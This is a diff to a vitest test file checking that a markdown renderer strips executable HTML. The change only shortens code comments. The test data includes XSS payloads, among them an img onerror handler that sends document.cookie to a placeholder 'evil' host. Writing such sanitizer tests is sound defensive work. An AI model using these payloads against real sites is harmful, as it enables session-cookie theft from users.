@@ -1,8 +1,7 @@
 import { describe, expect, it } from "vitest";
 import { renderMarkdownSafe } from "../markdown";
 
-// Assert the ABSENCE of the executable part, never exact entity spelling — escaping is
-// marked's to choose, and a safe upgrade may change it.
+// Assert the ABSENCE of the executable part, never exact entity spelling: escaping is marked's to choose.
 const EXECUTABLE = [
   ["block img handler", `<img src=x onerror="fetch('https://evil/'+document.cookie)">`],
   ["inline img handler", `a row that says <img src=x onerror=alert(1)> mid-sentence`],
@@ -17,8 +16,7 @@ const EXECUTABLE = [
 describe("renderMarkdownSafe", () => {
   it.each(EXECUTABLE)("neutralises %s", (_name, payload) => {
     const html = renderMarkdownSafe(payload);
-    // No live element and no handler survives as markup. `onerror=` may appear as escaped TEXT,
-    // so the test is that no `<tag` opened it — an attribute outside a tag cannot execute.
+    // `onerror=` may survive as escaped TEXT: an attribute outside a tag cannot execute.
     expect(html).not.toMatch(/<\s*(script|img|svg|iframe|body|details|a\s)/i);
     expect(html).not.toContain("<script");
   });
